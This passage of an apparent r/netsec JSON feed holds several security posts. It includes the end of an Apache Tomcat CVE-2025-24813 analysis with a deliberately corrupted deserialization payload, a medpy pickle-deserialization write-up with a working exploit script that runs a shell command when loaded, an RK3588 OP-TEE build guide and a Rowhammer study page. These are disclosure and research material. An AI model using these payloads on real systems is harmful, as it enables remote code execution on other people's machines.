(disabled by default)</li><li>support for partial PUT (enabled by default)</li><li>a target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads</li><li>attacker knowledge of the names of security sensitive files being uploaded</li><li>the security sensitive files also being uploaded via partial PUT</li></ol><p>Aside the aforementioned \"work\" directory, another relevant location here is the \"resource\" directory, mostly used for storing static resources like HTML pages required for the application. On my Debian these application directories are located under <code>/var/lib/tomcat10/webapps</code>.</p><p>Here's how the prerequisites make sense:</p><ul><li> +  are required to reach vulnerable code.</li><li> +  -&gt; A legitimate PUT request to http://example.com/top/secret.txt creates <code>&lt;Resource dir&gt;/top/secret.txt</code> from <code>&lt;Work dir&gt;/.top.secret.txt</code>. The latter temporary file <a href=\"https://github.com/apache/tomcat/blob/dfdb566007aa32cb97dd806785094036a5940ea5/java/org/apache/catalina/servlets/DefaultServlet.java#L666\">remains on the file-system</a> until Tomcat exits.</li><li>Because of  attacker can (re)create <code>&lt;Work dir&gt;/.top.secret.txt</code> by accessing http://example.com:8080/top.secret.txt. The file contents will be based on the leftover temp file created during the upload of the \"secret\" text. This is obviously a problem assuming access to http://example.com:8080/top/ is somehow restricted but http://example.com:8080/top.secret.txt is not.</li></ul><p>On my minimal Debian installation I could only recreate these circumstances by manually giving access to the \"resource\" directory for the  user - I assume such privileges are quite common in real-world scenarios.</p><div><pre><code>\n\n&lt;@d_base64&gt;r_O_0_A_B_X_N_y_A_B_F_q_Y_X_Z_h_L_n_V_0_a_W_w_u_S_G_F_z_a_E_1_h_c_A_U_H_2_s_H_D_F_m_D_R_A_w_A_C_R_g_A_K_b_G_9_h_Z_E_Z_h_Y_3_R_v_c_k_k_A_C_X_R_o_c_m_V_z_a_G_9_s_Z_H_h_w_P_0_A_A_A_A_A_A_A_A_x_3_C_A_A_A_A_B_A_A_A_A_A_B_c_3_I_A_D_G_p_h_d_m_E_u_b_m_V_0_L_l_V_S_T_J_Y_l_N_z_Y_a_/_O_R_y_A_w_A_H_S_Q_A_I_a_G_F_z_a_E_N_v_Z_G_V_J_A_A_R_w_b_3_J_0_T_A_A_J_Y_X_V_0_a_G_9_y_a_X_R_5_d_A_A_S_T_G_p_h_d_m_E_v_b_G_F_u_Z_y_9_T_d_H_J_p_b_m_c_7_T_A_A_E_Z_m_l_s_Z_X_E_A_f_g_A_D_T_A_A_E_a_G_9_z_d_H_E_A_f_g_A_D_T_A_A_I_c_H_J_v_d_G_9_j_b_2_x_x_A_H_4_A_A_0_w_A_A_3_J_l_Z_n_E_A_f_g_A_D_e_H_D_/_/_/_/_/_/_/_/_/_/_3_Q_A_C_3_B_v_c_m_5_o_d_W_I_u_Y_2_9_t_d_A_A_A_c_Q_B_+_A_A_V_0_A_A_R_o_d_H_R_w_c_H_h_0_A_B_J_o_d_H_R_w_O_i_8_v_c_G_9_y_b_m_h_1_Y_i_5_j_b_2_1_4_&lt;/@d_base64&gt;\n</code></pre></div><p>(I corrupted the payload slightly so my site won't be flagged by \"security\" vendors)</p><p>Before this analysis was done I was quick to predict that (based on the advisory) this one will end up in <a href=\"https://www.cisa.gov/known-exploited-vulnerabilities-catalog\">KEV</a>. Now as I see things more clearly disabling  or using  should be relatively rare, having both configured especially so, dropping my chances of being right significantly. </p><p>Nonetheless, Tomcat is everywhere and if the stars align this is a powerful exploit, so I'm still willing to bet a couple of beers on this!</p>","contentLength":6117,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1j9f0ur/analysis_of_cve202524813_apache_tomcat_path/"},{"title":"Impossible XXE in PHP","url":"https://swarm.ptsecurity.com/impossible-xxe-in-php/","date":1741766383,"author":"/u/Fugitif","guid":807,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1j9f0i7/impossible_xxe_in_php/"},{"title":"Detecting and Mitigating the Apache Camel Vulnerability CVE-2025-27636","url":"https://www.akamai.com/blog/security-research/march-apache-camel-vulnerability-detections-and-mitigations","date":1741721021,"author":"/u/oridavid1231","guid":804,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1j8z5i3/detecting_and_mitigating_the_apache_camel/"},{"title":"Npm Run Hack:Me - A Supply Chain Attack Journey","url":"https://rxj.dev/posts/npm-run-hack-supply-chain-attack-journey/","date":1741709539,"author":"/u/unknownhad","guid":797,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1j8ugic/npm_run_hackme_a_supply_chain_attack_journey/"},{"title":"Old medpy Deserialization Vulnerability","url":"https://www.partywave.site/show/research/Old_medpy_Vulnerability","date":1741702990,"author":"/u/AlbatrossMaximum4489","guid":795,"unread":true,"content":"<div><p><b>They certainly give very strange names to diseases.</b></p></div><a href=\"https://github.com/loli/medpy\">- https://github.com/loli/medpy</a><a href=\"https://github.com/loli/medpy/issues/137\">- https://github.com/loli/medpy/issues/137</a><img src=\"https://www.partywave.site/static/images/research-images/Old_medpy_Vulnerability/medpy-git.png\" loading=\"lazy\" alt=\"paragraph image 8 : Old medpy Vulnerability\"><pre><code>$ python3.11 -m virtualenv --python=python2.7 something\n$ source something/bin/activate\n$ pip2 install MedPy==0.3.0 --force\n$ pip2 install itk\n\n'''\nReplace something with you folder name, its just an example\n'''</code></pre><pre><code>82  def main():\n83      args = getArguments(getParser())\n84\n85      # prepare logger\n86      logger = Logger.getInstance()\n87      if args.debug: logger.setLevel(logging.DEBUG)\n88      elif args.verbose: logger.setLevel(logging.INFO)\n89\n90      # loading input images (as image, header pairs)\n91      images = []\n92      headers = []\n93      for image_name in args.images:\n94          i, h = load(image_name)\n95          images.append(i)\n96          headers.append(h)\n\n98      # loading binary foreground masks if supplied, else create masks from threshold value\n99      if args.masks:\n100          masks = [load(mask_name)[0].astype(numpy.bool) for mask_name in args.masks]\n101      else:\n102          masks = [i &gt; args.threshold for i in images]\n103\n104      # if in application mode, load the supplied model and apply it to the images\n105      if args.lmodel:\n106          logger.info('Loading the model and transforming images...')\n107          with open(args.lmodel, 'r') as f:\n108              trained_model = pickle.load(f) &lt;--------- THIS OUR VULNERABLE LINE</code></pre><pre><code>36 from medpy.io import load, save</code></pre><pre><code>174      apply_group.add_argument('--load-model', dest='lmodel', default=False, help='Location of the pickled intensity range model to load. Activated application mode.')\n175\n176      train_group = parser.add_argument_group('train a new model and save and/or apply it')\n177      train_group.add_argument('--save-model', dest='smodel', default=False, help='Save the trained model under this name as a pickled object (should end in .pkl). Activates training mode.')\n\n.....\nif __name__ == \"__main__\":\n    main()</code></pre><pre><code>usage: medpy_intensity_range_standardization.py [-h] [--load-model LMODEL]\n                                                [--save-model SMODEL]\n                                                [--cutoffp CUTOFFP]\n                                                [--landmarkp LANDMARKP]\n                                                [--stdspace STDSPACE]\n                                                [--save-images SIMAGES]\n                                                [--threshold THRESHOLD]\n                                                [--masks MASKS [MASKS ...]]\n                                                [--ignore] [-v] [-d] [-f]\n                                                images [images ...] &lt;---------- THIS IS THE IMAGE PART</code></pre><a href=\"https://www.partywave.site/show/research/Back_to_back_python_pickle\">- https://www.partywave.site/show/research/Back_to_back_python_pickle</a><pre><code>import pickle\nimport os\nimport numpy\n\n\n# code from the original class\nclass IntensityRangeStandardization(object):\n......\n......\n......\n    @staticmethod\n    def linear_model(x, y):\n        \"\"\"\n        Returns a linear model transformation function fitted on the two supplied points.\n        y = m*x + b\n        Note: Assumes that slope &gt; 0, otherwise division through zero might occur.\n        \"\"\"\n        x1, x2 = x\n        y1, y2 = y\n        m = (y2 - y1) / (x2 - x1)\n        b = y1 - (m * x1)\n        return lambda x: m * x + b\n\n    def __reduce__(self):\n        \"\"\"\n        Custom reduce method to execute a system command during deserialization.\n        \"\"\"\n        return (os.system, (\"echo `hostname` &gt; /tmp/dummino\",))\n\nobj = IntensityRangeStandardization()\npickled = pickle.dumps(obj, protocol=0) # Serialize the object with protocol 0 (text mode compatible)\n\nwith open(\"/tmp/modellino.pkl\", \"w\") as f:\n    f.write(pickled)\n\nprint(\"Object serialized and saved to /tmp/modellino.pkl\")</code></pre><pre><code>$ python2.7 exploit.py\nObject serialized and saved to /tmp/modellino.pkl</code></pre><pre><code>ls -la something/bin/medpy_intensity_range_standardization.py\n-rwxrwxr-x 1 kali kali 9676 Jan 17 15:58 something/bin/medpy_intensity_range_standardization.p\n\nmedpy_intensity_range_standardization.py --load-model /tmp/modellino.pkl otsu.png --save-images /tmp</code></pre><img src=\"https://www.partywave.site/static/images/research-images/Old_medpy_Vulnerability/medpy-exploit.png\" loading=\"lazy\" alt=\"paragraph image 29 : Old medpy Vulnerability\">","contentLength":4086,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1j8rx3b/old_medpy_deserialization_vulnerability/"},{"title":"HOWTO: build ATF (Trusted Firmware ARM) and OPTEE for RK3588","url":"https://hardenedvault.net/blog/2025-03-10-build-atf-optee-rk3588/","date":1741629196,"author":"/u/hardenedvault","guid":801,"unread":true,"content":"<h2>HOWTO: build ATF (Trusted Firmware ARM) and OPTEE for RK3588</h2><p>To better implement the protection of digital assets in embedded systems, we have chosen the RK3588 as the prototype platform. Firstly, the RK3588 is backed by an increasingly mature open-source ecosystem. Thanks to the continuous <a href=\"https://www.collabora.com/news-and-blog/blog/2024/02/21/almost-a-fully-open-source-boot-chain-for-rockchips-rk3588/\">efforts of Collabora</a> and the open-source community over the past two years, the RK3588 has achieved a <a href=\"https://www.cnx-software.com/2024/12/21/rockchip-rk3588-mainline-linux-support-current-status-and-future-work-for-2025/\">nearly complete ecosystem with support for key components</a> such as U-Boot, Linux kernel, NPU driver, ATF. In the meanwhile, the maintainer team of <a href=\"https://github.com/dogecoinfoundation\">The Dogecoin Foundation</a> has joined in supporting OP-TEE and completing key features of the hardware-based chain of trust and root of trust, such as OTP (One-Time Programmable) and HUK (Hardware Unique Key). Although open-source does not equal to security, its transparency benefits the security in either security audits and vulnerability hunting, thereby providing a solid foundation for the protection of digital assets.</p><p>Secondly, this SoC not only possesses excellent general computing performance but also must implement security extensions for MMU, similar to TZASC (TrustZone Address Space Controller). Such a design effectively isolates permissions across different software layers, preventing security risks revealed in analyses like <a href=\"https://github.com/hardenedlinux/tzram-audit\">tzram-audit</a>, and ensuring strict isolation between various security zones within the system, thus providing robust hardware-level protection for sensitive assets.</p><p>Thirdly, the RK3588 is equipped with a 6 TOPS NPU (Neural Processing Unit), which offers strong support for edge AI in embedded applications. For private AI application scenarios, such as assisting in crypto trading decisions and building secure, real-time knowledge bases, the high-performance NPU of the RK3588 can achieve efficient data processing and intelligent analysis, thereby promoting the deep application of AI in areas such as secure communication and digital asset management.</p><h2>the boot process of Rockchip</h2><p>The boot code outside of the SOC is mainly divided into two stages, located after 32KiB (64 sectors) and 8MiB (16384 sectors), respectively. The first stage is primarily responsible for memory initialization, while the second stage includes the ARM Trusted Firmware (ATF), TEE, and bootloader. U-Boot can be responsible for generating both of these stages</p><pre tabindex=\"0\"><code>$ make CROSS_COMPILE=aarch64-linux-gnu- PLAT=rk3588 DEBUG=1 SPD=opteed clean\n$ make CROSS_COMPILE=aarch64-linux-gnu- PLAT=rk3588 DEBUG=1 SPD=opteed\n</code></pre><p>Copy or link build/rk3588/debug/bl31/bl31.elf to rk3588/bl31.elf in the u-boot directory.</p><pre tabindex=\"0\"><code>$ make   CROSS_COMPILE64=aarch64-linux-gnu-   PLATFORM=rockchip PLATFORM_FLAVOR=rk3588   CFG_ARM64_core=y   CFG_USER_TA_TARGETS=ta_arm64   CFG_DT=y CFG_CORE_ARM64_PA_BITS=&lt;ram-bits&gt; clean\n$ make   CROSS_COMPILE64=aarch64-linux-gnu-   PLATFORM=rockchip PLATFORM_FLAVOR=rk3588   CFG_ARM64_core=y   CFG_USER_TA_TARGETS=ta_arm64   CFG_DT=y CFG_CORE_ARM64_PA_BITS=&lt;ram-bits&gt;\n</code></pre><p>Where ram-bits is the number of binary bits representing the actual size of memory in bytes.</p><p>Copy or link out/arm-plat-rockchip/core/tee.bin to rk3588/tee.bin in the u-boot directory.</p><p>Download the aforementioned memory initialization blob and copy it to rk3588/ddr.bin in the u-boot directory.</p><pre tabindex=\"0\"><code>$ make ARCH=arm CROSS_COMPILE=aarch64-linux-gnu- rock5a-rk3588s_defconfig\n$ make ARCH=arm CROSS_COMPILE=aarch64-linux-gnu- ROCKCHIP_TPL=rk3588/ddr.bin BL31=rk3588/bl31.elf TEE=rk3588/tee.bin\n$ mkimage -T rksd -n rk3588 -d rk3588/ddr.bin:spl/u-boot-spl.bin idbloader.img\n</code></pre><p>idbloader.img is the first stage, and u-boot.itb is the second stage. Writing both to the specified locations on the SD card will create a usable bootloader:</p><pre tabindex=\"0\"><code># dd if=idbloader.img of=/dev/sdX seek=64\n# dd if=u-boot.itb of=/dev/sdX seek=16384\n</code></pre><pre tabindex=\"0\"><code>U-Boot SPL 2025.04-rc3-00023-g6ae0a578de67 (Mar 03 2025 - 11:46:06 +0800)\nTrying to boot from MMC2\n## Checking hash(es) for config config-1 ... OK\n## Checking hash(es) for Image atf-1 ... sha256+ OK\n....\n....\n....\nNOTICE:  BL31: v2.12.0(debug):v2.12.0-617-ga8a5d39d6\nNOTICE:  BL31: Built : 16:15:14, Mar  6 2025\nINFO:    GICv3 without legacy support detected.\nINFO:    ARM GICv3 driver initialized in EL3\nINFO:    Maximum SPI INTID supported: 511\nINFO:    BL31: Initializing runtime services\nINFO:    BL31: cortex_a55: CPU workaround for erratum 1530923 was applied\nINFO:    BL31: Initializing BL32\nI/TC: \nI/TC: No non-secure external DT\nI/TC: OP-TEE version: 4.5.0-87-g873f5f6c7 (gcc version 14.2.0 (Debian 14.2.0-12)) #1 Tue Feb 25 03:51:56 UTC 2025 aarch64\nI/TC: WARNING: This OP-TEE configuration might be insecure!\nI/TC: WARNING: Please check https://optee.readthedocs.io/en/latest/architecture/porting_guidelines.html\nI/TC: Primary CPU initializing\nI/TC: GIC redistributor base address not provided\nI/TC: Assuming default GIC group status and modifier\nI/TC: Primary CPU switching to normal world boot\nINFO:    BL31: Preparing for EL3 exit to normal world\nINFO:    Entry point address = 0xa00000\nINFO:    SPSR = 0x3c9\nNOT_SUPPORTED: A Firmware Framework implementation does not exist\n\n\nU-Boot 2025.04-rc3-00023-g6ae0a578de67 (Mar 06 2025 - 16:16:43 +0800)\n\nModel: Radxa ROCK 5A\nSoC:   RK3588S\nDRAM:  8 GiB\nNOT_SUPPORTED: A Firmware Framework implementation does not exist\nI/TC: Reserved shared memory is enabled\nI/TC: Dynamic shared memory is disabled\nI/TC: Normal World virtualization support is disabled\nI/TC: Asynchronous notifications are disabled\noptee optee: OP-TEE capabilities mismatch\nCore:  344 devices, 32 uclasses, devicetree: separate\nMMC:   mmc@fe2c0000: 1, mmc@fe2e0000: 0\nLoading Environment from nowhere... OK\nIn:    serial@feb50000\nOut:   serial@feb50000\nErr:   serial@feb50000\nModel: Radxa ROCK 5A\nSoC:   RK3588S\nNet:   eth0: ethernet@fe1c0000\nHit any key to stop autoboot:  2 \b\b\b 1 \b\b\b 0 \nScanning for bootflows in all bootdevs\nSeq  Method       State   Uclass    Part  Name                      Filename\n---  -----------  ------  --------  ----  ------------------------  ----------------\nScanning global bootmeth 'efi_mgr':\nCard did not respond to voltage select! : -110\nCannot persist EFI variables without system partition\n  0  efi_mgr      ready   (none)       0  &lt;NULL&gt;                    \n** Booting bootflow '&lt;NULL&gt;' with efi_mgr\nLoading Boot0000 'mmc 1' failed\nEFI boot manager: Cannot load any image\nBoot failed (err=-14)\nScanning bootdev '<a href=\"https://hardenedvault.net/cdn-cgi/l/email-protection\" data-cfemail=\"c9a4a4aa89afacfbaaf9f9f9f9e7aba6a6bdadacbf\">[email&nbsp;protected]</a>':\n  1  extlinux     ready   mmc          3  <a href=\"https://hardenedvault.net/cdn-cgi/l/email-protection\" data-cfemail=\"c5a8a8a685a3a0f7a6f5f5f5f5eba7aaaab1a1a0b3ebb5a4b7b1\">[email&nbsp;protected]</a> /boot/extlinux/extlinux.conf\n** Booting bootflow '<a href=\"https://hardenedvault.net/cdn-cgi/l/email-protection\" data-cfemail=\"97fafaf4d7f1f2a5f4a7a7a7a7b9f5f8f8e3f3f2e1b9e7f6e5e3\">[email&nbsp;protected]</a>_3' with extlinux\nU-Boot menu\n1:\tDebian GNU/Linux 12 (bookworm) 6.1.43-20-rk2312\n2:\tDebian GNU/Linux 12 (bookworm) 6.1.43-20-rk2312 (rescue target)\nEnter choice: 1:\tDebian GNU/Linux 12 (bookworm) 6.1.43-20-rk2312\nRetrieving file: /boot/vmlinuz-6.1.43-20-rk2312\nRetrieving file: /boot/initrd.img-6.1.43-20-rk2312\nappend: root=UUID=3f7cc3b2-4026-493b-bc46-ee2668d25bcc console=ttyFIQ0,1500000n8 iomem=relaxed quiet splash loglevel=4 rw earlycon consoleblank=0 console=tty1 coherent_pool=2M irqchip.gicv3_pseudo_nmi=0 cgroup_enable=cpuset cgroup_memory=1 cgroup_enable=memory swapaccount=1\nRetrieving file: /usr/lib/linux-image-6.1.43-20-rk2312/rockchip/rk3588s-rock-5a.dtb\n## Flattened Device Tree blob at 12000000\n   Booting using the fdt blob at 0x12000000\nWorking FDT set to 12000000\n   Loading Ramdisk to ebeef000, end eceaeda5 ... OK\n   Loading Device Tree to 00000000ebeb2000, end 00000000ebeee8a8 ... OK\nWorking FDT set to ebeb2000\n\nStarting kernel ...\n\nI/TC: Secondary CPU 1 initializing\nI/TC: Secondary CPU 1 switching to normal world boot\nI/TC: Secondary CPU 2 initializing\nI/TC: Secondary CPU 2 switching to normal world boot\nI/TC: Secondary CPU 3 initializing\nI/TC: Secondary CPU 3 switching to normal world boot\nI/TC: Secondary CPU 4 initializing\n...\n...\n...\n[   19.295224] rk-pcie fe190000.pcie: PCIe Link Fail, LTSSM is 0x3, hw_retries=1\n[   20.330335] rk-pcie fe190000.pcie: failed to initialize host\n\nDebian GNU/Linux 12 rock-5a ttyFIQ0\n\nrock-5a login: \n</code></pre><pre tabindex=\"0\"><code>diff --git a/core/arch/arm/kernel/boot.c b/core/arch/arm/kernel/boot.c\n--- a/core/arch/arm/kernel/boot.c\n+++ b/core/arch/arm/kernel/boot.c\n@@ -1121,6 +1121,12 @@ static void init_secondary_helper(void)\n \tinit_vfp_nsec();\n \n \tIMSG(\"Secondary CPU %zu switching to normal world boot\", get_core_pos());\n+\n+\t{\n+\t\tconst paddr_t pa = CFG_TZDRAM_START;\n+\t\tvoid *va = phys_to_virt (pa, MEM_AREA_TEE_RAM, 0x100);\n+\t\tIMSG(\"VAULT: pa: 0x%08x val: 0x%08x,\", (unsigned int)pa, *(unsigned int*)va );\n+\t}\n }\n \n /*\n</code></pre><pre tabindex=\"0\"><code>I/TC: Secondary CPU 7 initializing\nI/TC: Secondary CPU 7 switching to normal world boot\nI/TC: VAULT: pa: 0x08400000 val: 0xaa0003f3,\n</code></pre><pre tabindex=\"0\"><code>[   54.127820] Internal error: synchronous external abort: 0000000096000010 [#1] SMP\n[   54.128488] Modules linked in: tzram_test(O+) zram zsmalloc vfat binfmt_misc fat snd_soc_es8316 pwm_fan cpufreq_dt rockchip_cpufreq ledtrig_netdev ledtrig_timer ledtrig_pattern ledtrig_heartbeat ledtrig_default_on fuse dm_mod ip_tables sdhci_of_dwcmshc dw_hdmi_qp_cec d\n[   54.131014] CPU: 1 PID: 1330 Comm: insmod Tainted: G           O       6.1.43-20-rk2312 #3e26818dc\n[   54.131804] Hardware name: Radxa ROCK 5A (DT)\n[   54.132190] pstate: 40400009 (nZcv daif +PAN -UAO -TCO -DIT -SSBS BTYPE=--)\n[   54.132806] pc : tzram_test_init+0x2c/0x1000 [tzram_test]\n[   54.133298] lr : do_one_initcall+0x84/0x1c4\n[   54.133678] sp : ffff80000cf3bae0\n[   54.133977] x29: ffff80000cf3bae0 x28: ffff800009eaa390 x27: 0000000000000000\n[   54.134609] x26: ffff80000cf3bca0 x25: 0000000000000000 x24: 0000000000000000\n[   54.135241] x23: 0000000000000000 x22: 0000000000000000 x21: ffff80000107c058\n[   54.135872] x20: ffff800009eaa2b8 x19: ffff80000104c000 x18: 0000000000000000\n[   54.136504] x17: 726464615f747269 x16: 76202c7838302578 x15: 0000aaaac5d10f70\n[   54.137135] x14: 5f736968745f5f00 x13: 0064692d646c6975 x12: 622e756e672e6574\n[   54.137767] x11: 0000000000000000 x10: 0000000000000000 x9 : ffff800008014bec\n[   54.138398] x8 : 0101010101010101 x7 : 7f7f7f7f7f7f7f7f x6 : 00000000000024a8\n[   54.139029] x5 : 00000000ffffffff x4 : 0000000000000cc0 x3 : 0000000000000000\n[   54.139661] x2 : ffff000008400000 x1 : 0000000008400000 x0 : ffff80000107b054\n[   54.140292] Call trace:\n[   54.140516]  tzram_test_init+0x2c/0x1000 [tzram_test]\n[   54.140973]  do_one_initcall+0x84/0x1c4\n[   54.141318]  do_init_module+0x54/0x1d8\n[   54.141654]  load_module+0x1848/0x1918\n[   54.141988]  __do_sys_finit_module+0x100/0x11c\n[   54.142388]  __arm64_sys_finit_module+0x20/0x28\n[   54.142797]  invoke_syscall+0x80/0x114\n[   54.143131]  el0_svc_common.constprop.0+0xd0/0x120\n[   54.143562]  do_el0_svc+0x98/0xbc\n[   54.143863]  el0_svc+0x24/0x48\n[   54.144144]  el0t_64_sync_handler+0x90/0xf8\n[   54.144520]  el0t_64_sync+0x174/0x178\n</code></pre><ul><li>Data encryption based on HUK and user-defined seeds</li><li>Compartmentation for bootflow (<a href=\"https://github.com/hardenedvault/vaultboot\">VaultBoot</a>) and runtime TAs</li><li>Further assessment, trade-off of anti-rollback, RPMB, use-case, etc.</li></ul>","contentLength":10834,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1j84rrm/howto_build_atf_trusted_firmware_arm_and_optee/"},{"title":"Azure’s Weakest Link? How API Connections Spill Secrets","url":"https://binsec.no/posts/2025/03/api-connections","date":1741613702,"author":"/u/piraterapper","guid":808,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1j7yqj6/azures_weakest_link_how_api_connections_spill/"},{"title":"FlippyR.AM: Large-Scale Rowhammer Study","url":"https://flippyr.am/","date":1741606313,"author":"/u/citirix","guid":805,"unread":true,"content":"<section>\n                In 2014,\n                <a href=\"https://users.ece.cmu.edu/~yoonguk/papers/kim-isca14.pdf\" target=\"_blank\">Kim et al.</a>\n                reported a new disturbance effect in modern DRAM that they\n                called Rowhammer. The Rowhammer effect flips bits in\n                inaccessible memory locations just by reading the content of\n                nearby memory locations that are attacker-accessible. They\n                trigger the Rowhammer effect by accessing memory locations at a\n                high frequency, using memory accesses and flushes. The root\n                problem behind Rowhammer is the continuous increase in cell\n                density in modern DRAM. In early 2015,\n                <a href=\"https://googleprojectzero.blogspot.com/2015/03/exploiting-dram-rowhammer-bug-to-gain.html\" target=\"_blank\">Seaborn and Dullien</a>\n                were the first to demonstrate the security impact of this new\n                disturbance effect. In two different exploit variants, they\n                demonstrated privilege escalation from the Google Chrome NaCl\n                sandbox to native code execution and from unprivileged native\n                code execution to kernel privileges. Later, in 2015,\n                <a href=\"https://arxiv.org/pdf/1507.06955\" target=\"_blank\">Gruss et al.</a>\n                demonstrated that this effect can even be triggered from\n                JavaScript, which they presented in their talk\n                <a href=\"https://media.ccc.de/v/32c3-7197-rowhammer_js_root_privileges_for_web_apps\" target=\"_blank\">\n                    \"Rowhammer.js: Root privileges for web apps?\"</a>\n                at 32C3.\n\n                <p>\n                    Now, in 2024, it is precisely 10 years after Rowhammer was\n                    discovered. We have seen a seemingly endless cat-and-mouse\n                    security game with a constant stream of new attacks and new\n                    defenses. New Rowhammer attacks pushed the boundaries\n                    further with each defense and challenge. While initial\n                    attacks required native code on Intel x86 with DDR3 memory,\n                    subsequent attacks have also been demonstrated on DDR4 and,\n                    more recently, DDR5. Attacks have also been demonstrated on\n                    mobile Arm processors and AMD x86 desktop processors.\n                    Furthermore, instead of native code, attacks from sandboxed\n                    JavaScript or even remote attacks via network have been\n                    demonstrated as well.\n                </p><p>\n                    We want to invite everyone to contribute to solving one of\n                    the biggest unanswered questions about Rowhammer: What is\n                    the real-world prevalence of the Rowhammer effect? How many\n                    systems, in their current configurations, are vulnerable to\n                    Rowhammer? As large-scale studies with hundreds to thousands\n                    of systems are not easy to perform, such a study has not yet\n                    been performed. Therefore, we developed a new framework to\n                    check if your system is vulnerable to Rowhammer,\n                    incorporating the state-of-the-art Rowhammer techniques and\n                    tools. Thus, we invite everyone to participate in this\n                    unique opportunity to join forces and close this research\n                    gap together.\n                </p></section><section><p>\n                    Welcome to our  Study. We want to analyze\n                    the prevalence of Rowhammer in real-world systems. Everybody\n                    can participate in our study. The entire source code is\n                    open-source and available via\n                    <a href=\"https://github.com/iisys-sns/FlippyRAM\" target=\"_blank\">GitHub</a>. You can either build the ISO yourself or run the entire\n                    study using Docker. However, we highly recommend using the\n                    <a href=\"https://flippyr.am/hammeriso.iso\">ISO image</a>. \n                    Simply follow these steps:\n                </p><ol><li> our\n                        <a href=\"https://flippyr.am/hammeriso.iso\">ISO image</a>\n                        and  it to a USB thumb drive (see the\n                        following Links for a instructions on\n                        <a href=\"https://wiki.archlinux.org/title/USB_flash_installation_medium#In_Windows\" target=\"_blank\">Windows</a><a href=\"https://wiki.archlinux.org/title/USB_flash_installation_medium#In_macOS\" target=\"_blank\">MacOS</a><a href=\"https://wiki.archlinux.org/title/USB_flash_installation_medium#In_GNU/Linux\" target=\"_blank\">Linux</a>).\n                    </li><li> the system you want to test using the thumb\n                        drive you created before.\n                    </li><li> the time the experiment should run and\n                         your participation in the study. (When\n                        you do not want to participate in our study, you can\n                        still check if your system is vulnerable to Rowhammer\n                        without submitting any data.)\n                    </li><li> for the experiment to finish</li><li>\n                        You will get a brief overview of the results.\n                        Additionally, the raw results will be stored on the\n                        thumb drive for you to inspect them afterwards.\n                    </li><li>\n                        The results will be uploaded to our server and you can\n                        access them using a URL shown at the end of the test\n                        (only if you confimed to participate before).\n                    </li></ol></section><section><p>\n                    When you upload a valid dataset, you will receive a\n                    cryptographic token. This token is generated by hashing\n                    random data, and when you upload your dataset, we will save\n                    this token separately in our database. This means the token\n                    is not associated with your dataset. This ensures that you\n                    can participate in the raffle without linking the token to\n                    your dataset. Please make sure to bookmark or save this\n                    token. As an incentive, the following two rewards can be\n                    won:\n                </p><ol><li>\n                        The first people to send us 10 valid tokens via e-mail\n                        (<code>flippy underscore ram at hof minus university dot\n                            de</code>) will receive a free flippyr.am t-shirt. We have 10\n                        t-shirts to give away. First come, first served!\n                    </li><li>\n                        Everyone who sends us an e-mail with a valid token will\n                        participate in a raffle and have a chance to win a\n                        €10 Amazon gift card. The more tokens you send us,\n                        the higher your chances are.\n                    </li></ol></section><section><h2>I got a USB Stick at 38C3. How to verify it?</h2><p>You can use the following SHA256 hashes to verify if the USB\n\t\t\t\t\t\t\t\t Stick you got from us is original and was not modified. Because\n\t\t\t\t\t\t\t\t we fixed a minor bug while flashing, there are two different\n\t\t\t\t\t\t\t\t thumb drives, so your thumb drive should have one of the\n\t\t\t\t\t\t\t\t following SHA256 hashes:\n\t\t\t\t\t\t\t\t\t</p><ul><li>Old Version (before bug fix):\n\t\t\t\t\t\t\t\t\t\t\t<code>c3261b3ee53b1da5a24d1d5fa34d09d779991acc23f6f2398c51c51f4eaea6d9</code></li><li>New Version (after bug fix):\n\t\t\t\t\t\t\t\t\t\t\t<code>cb894dcf7926550293efa5baf7776350e44f63ea475bef7c50c752692737a7fb</code></li></ul><p>The SHA256 sums are calculated over the entire devices\n\t\t\t\t\t\t\t\t (e.g., /dev/sdb) and will change at first boot since running\n\t\t\t\t\t\t\t\t the experiment will resize the partitions and store files on\n\t\t\t\t\t\t\t\t the devices.</p></section><section><h2>How to verify the ISO image?</h2><p>The ISO image can be verified using SHA256. The current image\n\t\t\t\t\t\t\t\tuploaded by us has the following hash:\n\t\t\t\t\t\t\t\t</p><ul><li><code>df42c0310e8a576ceeeeb8f56e806b76b256c239a795f8f443dcaf681614bce7</code></li><li><code>7180a19a1599ac07b7cfd8f18a61194a160b482da36981e9d45464bd880d3d9f</code></li></ul></section>","contentLength":7239,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1j7whk7/flippyram_largescale_rowhammer_study/"}],"tags":["netsec"]}